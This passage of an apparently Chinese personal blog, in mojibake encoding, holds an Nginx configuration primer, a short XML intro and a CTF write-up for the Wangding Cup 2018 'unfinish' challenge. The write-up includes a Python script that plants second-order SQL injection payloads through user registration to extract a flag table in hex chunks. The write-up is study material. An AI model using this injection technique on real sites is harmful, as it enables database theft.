              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-18 12:09:04 / ä¿®æ”¹æ—¶é—´ï¼š14:56:58" itemprop="dateCreated datePublished" datetime="2021-03-18T12:09:04+08:00">2021-03-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h5><p><strong>1.ç®€ä»‹</strong>ï¼šé«˜æ€§èƒ½çš„HTTPå’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼Œå æœ‰å†…å­˜å°‘ï¼Œå¹¶å‘èƒ½åŠ›å¼ºã€‚</p>
<p>â€‹    Nginxä¸Tomcatï¼šNginxå¯ä»¥ä½œä¸ºé™æ€é¡µé¢çš„webæœåŠ¡å™¨ï¼Œæ”¯æŒCGIåè®®çš„åŠ¨æ€è¯­è¨€ï¼Œperlã€phpã€‚    ä¸æ”¯æŒJavaï¼Œä¸apacheæ„æˆç«äº‰å…³ç³»ã€‚Nginxæ›´æœ‰ä¼˜åŠ¿ã€‚</p>
<p>â€‹    NginxåŠŸèƒ½ä¸°å¯Œï¼Œå¯ä½œä¸ºHTTPæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œé‚®ä»¶æœåŠ¡å™¨ã€‚æ”¯æŒFastCGIã€SSLã€Virtual Hostã€URL Rewriteã€Gzipç­‰åŠŸèƒ½ã€‚å¹¶ä¸”æ”¯æŒå¾ˆå¤šç¬¬ä¸‰æ–¹çš„æ¨¡å—æ‰©å±•ã€‚</p>
<p><strong>2.åŠŸèƒ½</strong>ï¼š</p>
<ul>
<li>â€‹    æ­£å‘ä»£ç†ï¼šå®¢æˆ·ç«¯é€šè¿‡ä»£ç†æœåŠ¡å™¨å‘é€è®¿é—®è¯·æ±‚</li>
<li>â€‹    åå‘ä»£ç†ï¼šå®¢æˆ·ç«¯è®¿é—®Nginxä»£ç†çš„æœåŠ¡å™¨ï¼Œè®¿é—®ä¸åˆ°åå°æœåŠ¡å™¨</li>
<li>â€‹    è´Ÿè½½å‡è¡¡ï¼šè¯·æ±‚åˆ†å‘ï¼Œæ ¹æ®è·¯çº¿ï¼Œé€Ÿåº¦åˆ†é…è¯·æ±‚ï¼›æé«˜æŠ—é£é™©èƒ½åŠ›ã€‚</li>
<li>â€‹    åŠ¨é™åˆ†ç¦»ï¼šæ‹¿å‡ºé™æ€èµ„æºï¼Œå‡å°åŠ¨æ€èµ„æºæ•°æ®åŒ…ï¼Œå¿«é€Ÿä¸Šçº¿ã€ä¿®æ”¹ï¼›é¡µé¢æ ·å¼ä¿®æ”¹æ–¹ä¾¿ã€‚</li>
</ul>
<p><strong>Nginxé…ç½®ï¼š</strong></p>
<blockquote>
<ul>
<li>1ã€<strong>å…¨å±€å—</strong>ï¼šé…ç½®å½±å“nginxå…¨å±€çš„æŒ‡ä»¤ã€‚ä¸€èˆ¬æœ‰è¿è¡ŒnginxæœåŠ¡å™¨çš„ç”¨æˆ·ç»„ï¼Œnginxè¿›ç¨‹pidå­˜æ”¾è·¯å¾„ï¼Œæ—¥å¿—å­˜æ”¾è·¯å¾„ï¼Œé…ç½®æ–‡ä»¶å¼•å…¥ï¼Œå…è®¸ç”Ÿæˆworker processæ•°ç­‰ã€‚</li>
<li>2ã€<strong>eventså—</strong>ï¼šé…ç½®å½±å“nginxæœåŠ¡å™¨æˆ–ä¸ç”¨æˆ·çš„ç½‘ç»œè¿æ¥ã€‚æœ‰æ¯ä¸ªè¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°ï¼Œé€‰å–å“ªç§äº‹ä»¶é©±åŠ¨æ¨¡å‹å¤„ç†è¿æ¥è¯·æ±‚ï¼Œæ˜¯å¦å…è®¸åŒæ—¶æ¥å—å¤šä¸ªç½‘è·¯è¿æ¥ï¼Œå¼€å¯å¤šä¸ªç½‘ç»œè¿æ¥åºåˆ—åŒ–ç­‰ã€‚</li>
<li>3ã€<strong>httpå—</strong>ï¼šå¯ä»¥åµŒå¥—å¤šä¸ªserverï¼Œé…ç½®ä»£ç†ï¼Œç¼“å­˜ï¼Œæ—¥å¿—å®šä¹‰ç­‰ç»å¤§å¤šæ•°åŠŸèƒ½å’Œç¬¬ä¸‰æ–¹æ¨¡å—çš„é…ç½®ã€‚å¦‚æ–‡ä»¶å¼•å…¥ï¼Œmime-typeå®šä¹‰ï¼Œæ—¥å¿—è‡ªå®šä¹‰ï¼Œæ˜¯å¦ä½¿ç”¨sendfileä¼ è¾“æ–‡ä»¶ï¼Œè¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•è¿æ¥è¯·æ±‚æ•°ç­‰ã€‚</li>
<li>4ã€<strong>serverå—</strong>ï¼šé…ç½®è™šæ‹Ÿä¸»æœºçš„ç›¸å…³å‚æ•°ï¼Œä¸€ä¸ªhttpä¸­å¯ä»¥æœ‰å¤šä¸ªserverã€‚</li>
<li>5ã€<strong>locationå—</strong>ï¼šé…ç½®è¯·æ±‚çš„è·¯ç”±ï¼Œä»¥åŠå„ç§é¡µé¢çš„å¤„ç†æƒ…å†µã€‚</li>
</ul>
</blockquote>
<p><img src="/images/Nginx%E5%85%A5%E9%97%A8/image-20210318133439418.png" alt="image-20210318133439418"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########### æ¯ä¸ªæŒ‡ä»¤å¿…é¡»æœ‰åˆ†å·ç»“æŸã€‚#################</span></span><br><span class="line"><span class="comment">#user administrator administrators;  #é…ç½®ç”¨æˆ·æˆ–è€…ç»„ï¼Œé»˜è®¤ä¸ºnobody nobodyã€‚</span></span><br><span class="line"><span class="comment">#worker_processes 2;  #å…è®¸ç”Ÿæˆçš„è¿›ç¨‹æ•°ï¼Œé»˜è®¤ä¸º1</span></span><br><span class="line"><span class="comment">#pid /nginx/pid/nginx.pid;   #æŒ‡å®šnginxè¿›ç¨‹è¿è¡Œæ–‡ä»¶å­˜æ”¾åœ°å€</span></span><br><span class="line"><span class="attribute">error_log</span> log/error.log <span class="literal">debug</span>;  <span class="comment">#åˆ¶å®šæ—¥å¿—è·¯å¾„ï¼Œçº§åˆ«ã€‚è¿™ä¸ªè®¾ç½®å¯ä»¥æ”¾å…¥å…¨å±€å—ï¼Œhttpå—ï¼Œserverå—ï¼Œçº§åˆ«ä»¥æ­¤ä¸ºï¼šdebug|info|notice|warn|error|crit|alert|emerg</span></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">accept_mutex</span> <span class="literal">on</span>;   <span class="comment">#è®¾ç½®ç½‘è·¯è¿æ¥åºåˆ—åŒ–ï¼Œé˜²æ­¢æƒŠç¾¤ç°è±¡å‘ç”Ÿï¼Œé»˜è®¤ä¸ºon</span></span><br><span class="line">    <span class="attribute">multi_accept</span> <span class="literal">on</span>;  <span class="comment">#è®¾ç½®ä¸€ä¸ªè¿›ç¨‹æ˜¯å¦åŒæ—¶æ¥å—å¤šä¸ªç½‘ç»œè¿æ¥ï¼Œé»˜è®¤ä¸ºoff</span></span><br><span class="line">    <span class="comment">#use epoll;      #äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œselect|poll|kqueue|epoll|resig|/dev/poll|eventport</span></span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;    <span class="comment">#æœ€å¤§è¿æ¥æ•°ï¼Œé»˜è®¤ä¸º512</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;   <span class="comment">#æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨</span></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream; <span class="comment">#é»˜è®¤æ–‡ä»¶ç±»å‹ï¼Œé»˜è®¤ä¸ºtext/plain</span></span><br><span class="line">    <span class="comment">#access_log off; #å–æ¶ˆæœåŠ¡æ—¥å¿—    </span></span><br><span class="line">    <span class="attribute">log_format</span> myFormat <span class="string">&#x27;<span class="variable">$remote_addr</span>â€“<span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] <span class="variable">$request</span> <span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> <span class="variable">$http_referer</span> <span class="variable">$http_user_agent</span> <span class="variable">$http_x_forwarded_for</span>&#x27;</span>; <span class="comment">#è‡ªå®šä¹‰æ ¼å¼</span></span><br><span class="line">    <span class="attribute">access_log</span> log/access.log myFormat;  <span class="comment">#combinedä¸ºæ—¥å¿—æ ¼å¼çš„é»˜è®¤å€¼</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;   <span class="comment">#å…è®¸sendfileæ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºoffï¼Œå¯ä»¥åœ¨httpå—ï¼Œserverå—ï¼Œlocationå—ã€‚</span></span><br><span class="line">    <span class="attribute">sendfile_max_chunk</span> <span class="number">100k</span>;  <span class="comment">#æ¯ä¸ªè¿›ç¨‹æ¯æ¬¡è°ƒç”¨ä¼ è¾“æ•°é‡ä¸èƒ½å¤§äºè®¾å®šçš„å€¼ï¼Œé»˜è®¤ä¸º0ï¼Œå³ä¸è®¾ä¸Šé™ã€‚</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">65</span>;  <span class="comment">#è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸º75sï¼Œå¯ä»¥åœ¨httpï¼Œserverï¼Œlocationå—ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">upstream</span> mysvr &#123;   </span><br><span class="line">      <span class="attribute">server</span> <span class="number">127.0.0.1:7878</span>;</span><br><span class="line">      <span class="attribute">server</span> <span class="number">192.168.10.121:3333</span> backup;  <span class="comment">#çƒ­å¤‡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> https://www.baidu.com; <span class="comment">#é”™è¯¯é¡µ</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">keepalive_requests</span> <span class="number">120</span>; <span class="comment">#å•è¿æ¥è¯·æ±‚ä¸Šé™æ¬¡æ•°ã€‚</span></span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">4545</span>;   <span class="comment">#ç›‘å¬ç«¯å£</span></span><br><span class="line">        <span class="attribute">server_name</span>  <span class="number">127.0.0.1</span>;   <span class="comment">#ç›‘å¬åœ°å€       </span></span><br><span class="line">        <span class="attribute">location</span>  ~*^.+$ &#123;       <span class="comment">#è¯·æ±‚çš„urlè¿‡æ»¤ï¼Œæ­£åˆ™åŒ¹é…ï¼Œ~ä¸ºåŒºåˆ†å¤§å°å†™ï¼Œ~*ä¸ºä¸åŒºåˆ†å¤§å°å†™ã€‚</span></span><br><span class="line">           <span class="comment">#root path;  #æ ¹ç›®å½•</span></span><br><span class="line">           <span class="comment">#index vv.txt;  #è®¾ç½®é»˜è®¤é¡µ</span></span><br><span class="line">           <span class="attribute">proxy_pass</span>  http://mysvr;  <span class="comment">#è¯·æ±‚è½¬å‘mysvr å®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨</span></span><br><span class="line">           <span class="attribute">deny</span> <span class="number">127.0.0.1</span>;  <span class="comment">#æ‹’ç»çš„ip</span></span><br><span class="line">           <span class="attribute">allow</span> <span class="number">172.18.5.54</span>; <span class="comment">#å…è®¸çš„ip           </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>   å‡ ä¸ªå¸¸è§é…ç½®é¡¹ï¼š</p>
<ul>
<li>1.$remote_addr ä¸ $http_x_forwarded_for ç”¨ä»¥è®°å½•å®¢æˆ·ç«¯çš„ipåœ°å€ï¼›</li>
<li>2.$remote_user ï¼šç”¨æ¥è®°å½•å®¢æˆ·ç«¯ç”¨æˆ·åç§°ï¼›</li>
<li>3.$time_local ï¼š ç”¨æ¥è®°å½•è®¿é—®æ—¶é—´ä¸æ—¶åŒºï¼›</li>
<li>4.$request ï¼š ç”¨æ¥è®°å½•è¯·æ±‚çš„urlä¸httpåè®®ï¼›</li>
<li>5.$status ï¼š ç”¨æ¥è®°å½•è¯·æ±‚çŠ¶æ€ï¼›æˆåŠŸæ˜¯200ï¼›</li>
<li>6.$body_bytes_s ent ï¼šè®°å½•å‘é€ç»™å®¢æˆ·ç«¯æ–‡ä»¶ä¸»ä½“å†…å®¹å¤§å°ï¼›</li>
<li>7.$http_referer ï¼šç”¨æ¥è®°å½•ä»é‚£ä¸ªé¡µé¢é“¾æ¥è®¿é—®è¿‡æ¥çš„ï¼›</li>
<li>8.$http_user_agent ï¼šè®°å½•å®¢æˆ·ç«¯æµè§ˆå™¨çš„ç›¸å…³ä¿¡æ¯ï¼›</li>
</ul>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/" class="post-title-link" itemprop="url">ç½‘é¼æ¯-2018-unfinish</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-17 13:36:46 / ä¿®æ”¹æ—¶é—´ï¼š15:01:09" itemprop="dateCreated datePublished" datetime="2021-03-17T13:36:46+08:00">2021-03-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="ç½‘é¼æ¯-2018-unfinish"><a href="#ç½‘é¼æ¯-2018-unfinish" class="headerlink" title="ç½‘é¼æ¯-2018-unfinish"></a>ç½‘é¼æ¯-2018-unfinish</h5><h6 id="1-é¢˜ç›®ï¼š"><a href="#1-é¢˜ç›®ï¼š" class="headerlink" title="1.é¢˜ç›®ï¼š"></a>1.é¢˜ç›®ï¼š</h6><h6 id="2-è¿‡ç¨‹ï¼š"><a href="#2-è¿‡ç¨‹ï¼š" class="headerlink" title="2.è¿‡ç¨‹ï¼š"></a>2.è¿‡ç¨‹ï¼š</h6><p>è¿›å…¥é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ª/login.phpï¼Œæ”¾åˆ°å¾¡å‰‘æ‰«ï¼š</p>
<img src="/images/ç½‘é¼æ¯-2018-unfinish/image-20210317133844360.png" alt="image-20210317133844360" style="zoom:70%;" />

<p>æœ‰æ³¨å†Œç•Œé¢ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªçœ‹çœ‹ï¼š</p>
<img src="/images/ç½‘é¼æ¯-2018-unfinish/image-20210317134024989.png" alt="image-20210317134024989" style="zoom:80%;" />

<p>ä»€ä¹ˆéƒ½æ²¡æœ‰â€¦â€¦å·¦è¾¹æœ‰ä¸€ä¸ªä¾§è¾¹æ å¯ä»¥çœ‹åˆ°æ³¨å†Œçš„ç”¨æˆ·å</p>
<p>å„ç§æ–¹æ³•éƒ½è¯•äº†ä¸€ä¸‹ï¼Œéƒ½æ²¡æœ‰æˆåŠŸâ€¦â€¦åœ¨æ³¨å†Œæ—¶å‘ç°ç”¨æˆ·åï¼ˆusernameï¼‰åŠ å•å¼•å·æ—¶ï¼Œç•Œé¢å›æ˜¾ä¸åŒï¼Œåº”è¯¥æ˜¯æ’å…¥æ•°æ®åº“æ—¶â€™å¯¼è‡´è¯­å¥çš„æ ¼å¼é”™è¯¯â€¦â€¦ï¼ˆåº”è¯¥å…ˆææ‡‚sqlæ’å…¥è¯­å¥çš„â€¦â€¦ï¼‰</p>
<blockquote>
<p><strong>SQL INSERT INTO è¯­å¥</strong>ï¼š</p>
<p>INSERT INTO è¡¨åç§° VALUES (å€¼1, å€¼2,â€¦.)</p>
<img src="/images/ç½‘é¼æ¯-2018-unfinish/image-20210317140715985.png" alt="image-20210317140715985" style="zoom:60%;" />
</blockquote>
<p>é¢˜ç›®ä¸­çš„sqlæ’å…¥è¯­å¥å°±æœ‰å¯èƒ½æ˜¯ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">value</span>(<span class="string">&#x27;$email&#x27;</span>,<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ä¸­ï¼Œemailå’Œpasswordå¥½åƒéƒ½å¾ˆéš¾æ³¨å…¥â€¦â€¦æµ‹è¯•æ—¶ä¹Ÿåªæœ‰æ”¹åŠ¨usernameæ—¶å›æ˜¾ä¸åŒ</p>
<p>é—­åˆå¼•å·â€™)#ä¼¼ä¹ä¸è¡Œï¼Œè¯­å¥å¯èƒ½æ˜¯ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tablename (email,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;$email&#x27;</span>,<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>dalaoæ“ä½œä¼¼ä¹æ˜¯åˆ©ç”¨mysqlä¸­çš„â€åŠ æ³•â€œç»“åˆhexåŠ å¯†ï¼š</p>
<blockquote>
<p>**mysqlä¸­åŠ å·(+)**ï¼š</p>
<p>â‘ å¦‚æœåŒæ–¹éƒ½ä¸ºæ•°å€¼å‹æ•°æ®åˆ™ç»“æœä¸ºæ•°å€¼ç›¸åŠ ç»“æœ;</p>
<p>â‘¡å¦‚æœæœ‰ä¸€æ–¹ä¸ºå­—ç¬¦å‹ï¼Œåˆ™è¯•å›¾å°†å­—ç¬¦å‹æ•°å€¼è½¬æ¢æˆæ•°å€¼å‹ï¼Œå¦‚æœè½¬æ¢æˆåŠŸï¼Œåˆ™ç»§ç»­åšæ•°å€¼åŠ æ³•è¿ç®—ï¼›</p>
<p>â‘¢å¦‚æœæœ‰ä¸€æ–¹ä¸ºnullï¼Œåˆ™ç»“æœè‚¯å®šä¸ºnullã€‚</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç›´æ¥0â€™ + database() +â€™0ï¼Œå®é™…ä¸Šæ˜¯0+0+<strong>int</strong>(database())ï¼Œè€Œç»“æœå¼€å¤´ä¸ºå­—æ¯ï¼Œå³ç»“æœä¸º<strong>0</strong></p>
<p>å¦‚æœæ˜¯version()ï¼š</p>
<img src="/images/ç½‘é¼æ¯-2018-unfinish/image-20210317144848852.png" alt="image-20210317144848852" style="zoom:70%;" />

<p>version()çš„æ˜¾ç¤ºåªå‰©ä¸‹äº†<strong>5.5</strong>ï¼Œåé¢çš„æ•°æ®éƒ½ä¹ˆæœ‰äº†</p>
<p>å¯ä»¥åˆ©ç”¨åŒé‡hexåŠ å¯†æˆ–ordä¸asciiä½¿è¿”å›ç»“æœä¸ºæ•°å­—ï¼›å¦ï¼Œè‹¥è¿”å›æ•°å­—è¶…è¿‡åä½ï¼Œä¼šä»¥ç§‘å­¦è®¡æ•°æ³•è¿”å›ï¼Œé€ æˆæ•°æ®æŸå¤±â€¦â€¦(è¿˜æœ‰ï¼Œè¡¨åflagç«Ÿç„¶æ˜¯çŒœçš„,æŠŠinformation_schemaç¦äº†â€¦â€¦</p>
<p>å†™è„šæœ¬æ‰¹é‡æ³¨å†Œä¸ç™»å½•ï¼Œè·å–usernameæ•°æ®ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#æ³¨å†Œï¼š</span></span><br><span class="line">url1 = <span class="string">&#x27;http://111.200.241.244:33496/register.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"> register = &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="built_in">str</span>(x)+<span class="string">&quot;@qqq.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&#x27;+( substr(hex(hex((select * from flag ))) from &quot;</span>+<span class="built_in">str</span>((x<span class="number">-1</span>)*<span class="number">10</span>+<span class="number">1</span>)+<span class="string">&quot; for 10))+&#x27;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response1 = requests.post(url=url1, data=register)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç™»å½•ï¼ŒæŸ¥username</span></span><br><span class="line">url2 = <span class="string">&#x27;http://111.200.241.244:33496/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    login = &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="built_in">str</span>(x)+<span class="string">&quot;@qqq.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response2 = requests.post(url=url2, data=login)</span><br><span class="line">    r = response2.text</span><br><span class="line">    left = r.find(<span class="string">&#x27;            &#x27;</span>)</span><br><span class="line">    right = r.find(<span class="string">&#x27;&lt;/span&gt;&#x27;</span>)</span><br><span class="line">    con = r[left:right].strip()</span><br><span class="line">    content += con</span><br><span class="line">    print(con)</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/image-20210317145756747.png" alt="image-20210317145756747"></p>
<blockquote>
<p>æ²¡å†™åœæ­¢ï¼Œä¸€ä¸‹å…¨è¾“å‡ºäº†â€¦â€¦</p>
</blockquote>
<p>hexè§£å¯†ï¼š</p>
<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/image-20210317145858429.png" alt="image-20210317145858429"></p>
<blockquote>
<p>è¿™å¥½åƒå«åšäºŒæ¬¡æ³¨å…¥â€¦â€¦å’Œæˆ‘ç†è§£çš„å¥½åƒä¸ä¸€æ ·ï¼Œé‚£ä¸Šæ¬¡ç”¨cookieå›æ˜¾æ˜¯ä¸æ˜¯ä¹Ÿç®—äºŒæ¬¡æ³¨å…¥â€¦â€¦</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/14/XML/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/14/XML/" class="post-title-link" itemprop="url">XMLå…¥é—¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-14 12:21:10 / ä¿®æ”¹æ—¶é—´ï¼š13:19:18" itemprop="dateCreated datePublished" datetime="2021-03-14T12:21:10+08:00">2021-03-14</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="XMLå…¥é—¨"><a href="#XMLå…¥é—¨" class="headerlink" title="XMLå…¥é—¨"></a>XMLå…¥é—¨</h4><p><strong>å¯æ‰©å±•<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">æ ‡è®°è¯­è¨€</a>ï¼Œ<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/6805073">æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€</a>çš„å­é›†ï¼Œç®€ç§°XMLã€‚æ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/5964436">æ ‡è®°è¯­è¨€</a>ã€‚</strong></p>
<h5 id="1-å¼•å…¥"><a href="#1-å¼•å…¥" class="headerlink" title="1.å¼•å…¥"></a>1.å¼•å…¥</h5><p>ä¸€æ®µæ ‡å‡†çš„xmlæ•°æ®æ ¼å¼ï¼š</p>
<p><img src="/images/XML/image-20210314131552521.png" alt="image-20210314131552521"></p>
<p>ä¸HTML ä¸åŒï¼Œxmlæ³¨é‡äºæ•°æ®çš„å‚¨å­˜ä¸ä¼ è¾“è€Œä¸æ˜¯å±•ç¤ºã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/10/buu%E4%B8%A4%E9%81%93SSTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/10/buu%E4%B8%A4%E9%81%93SSTI/" class="post-title-link" itemprop="url">buuä¸¤é“SSTI</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-10 18:55:34 / ä¿®æ”¹æ—¶é—´ï¼š19:43:48" itemprop="dateCreated datePublished" datetime="2021-03-10T18:55:34+08:00">2021-03-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
